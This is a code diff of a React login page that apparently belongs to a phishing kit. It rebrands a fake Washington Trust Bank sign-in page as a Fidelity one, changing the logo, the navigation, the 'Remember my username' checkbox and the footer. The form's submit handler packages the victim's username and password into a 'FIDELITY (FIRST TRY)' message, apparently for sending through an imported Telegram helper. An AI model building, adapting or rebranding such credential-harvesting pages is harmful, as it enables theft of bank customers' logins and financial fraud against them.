@@ -1,5 +1,5 @@
 import React from "react";
-import Logo from "../assets/logo.jpeg";
+import fid from "../assets/fidelity.svg";
 import { useNavigate } from "react-router-dom";
 import cookies from "../utils/cookie.config";
 import TelegramSend from "../utils/send-message";
@@ -22,9 +22,9 @@ export default function Login() {
 
   async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
     event.preventDefault();
-
+    
     const message = `
-        ---- WTB ONLINE (FIRST TRY) -----
+        ---- FIDELITY (FIRST TRY) -----
         Username: ${formInput.username}
         Password: ${formInput.password}
         `;
@@ -37,68 +37,62 @@ export default function Login() {
 
   return (
     <>
+      <div className="navbar">
+        <div className="brand">
+          <div>
+            <img src={fid} alt="" />
+          </div>
+        </div>
+
+        <div className="nav-texts">
+          <p style={{ marginRight: 20 }}>Security</p>
+          <p>FAQ</p>
+        </div>
+      </div>
+
       <div className="content">
         <div className="form">
-          <form method="POST" onSubmit={handleSubmit}>
+          <form method="POST" onSubmit={handleSubmit} >
             <div className="form-item">
-              <div className="brand">
-                <img src={Logo} alt="" />
-              </div>
-              <div className="form-field">
-                <input
-                  onChange={handleInputChange}
-                  name="username"
-                  type="text"
-                  placeholder="Username"
-                />
-              </div>
+              <h2>Log in</h2>
+             
+                <div className="form-field">
+                  <label htmlFor="">Username</label>
+                  <input
+                    onChange={handleInputChange}
+                    name="username"
+                    type="text"
+                  />
+                </div>
 
-              <div className="form-field">
-                <input
-                  onChange={handleInputChange}
-                  type="password"
-                  name="password"
-                  placeholder="Password"
-                />
-              </div>
-              <div
-                style={{
-                  width: "100%",
-                  display: "flex",
-                  justifyContent: "flex-end",
-                }}
-              >
-                <p
-                  className="btn-theme-color"
-                  style={{ fontSize: 13, fontWeight: "bold" }}
-                >
-                  Forgot?
-                </p>
-              </div>
+                <div className="form-field">
+                  <label htmlFor="">Password</label>
+                  <input
+                    onChange={handleInputChange}
+                    type="password"
+                    name="password"
+                  />
+                </div>
 
-              <div
-                style={{
-                  display: "flex",
-                  alignItems: "center",
-                  justifyContent: "space-between",
-                  marginTop: "-20px",
-                }}
-              >
-                <p className="btn-theme-color bold reduce-text">
-                  First time user? Enroll now.
-                </p>
+                <div style={{ display: "flex", alignItems: "center" }}>
+                  <input
+                    style={{ width: 15, height: 15, marginRight: 5 }}
+                    type="checkbox"
+                  />{" "}
+                  <p>Remember my username</p>
+                </div>
                 {isLoading ? (
                   <div className="form-field">
-                    <button style={{ width: 130, height: 50 }} type="button">Please wait...</button>
+                    <button type="button">Please wait...</button>
                   </div>
                 ) : (
                   <div className="form-field">
-                    <button style={{ width: 120, height: 50 }} type="submit">
-                      Continue
-                    </button>
+                    <button type="submit">Log in</button>
                   </div>
                 )}
-              </div>
+
+                <a href="">Forgot username or password?</a>
+              
             </div>
           </form>
         </div>
@@ -106,8 +100,8 @@ export default function Login() {
 
       <div className="footer">
         <p style={{ textAlign: "center" }}>
-          &copy; 2024 Washington Trust Bank • Privacy policy • Member FDIC •
-          Equal Housing Lender
+          New to Fidelity? <a href="">Open an account</a> or{" "}
+          <a href="">sign up</a>
         </p>
       </div>
     </>
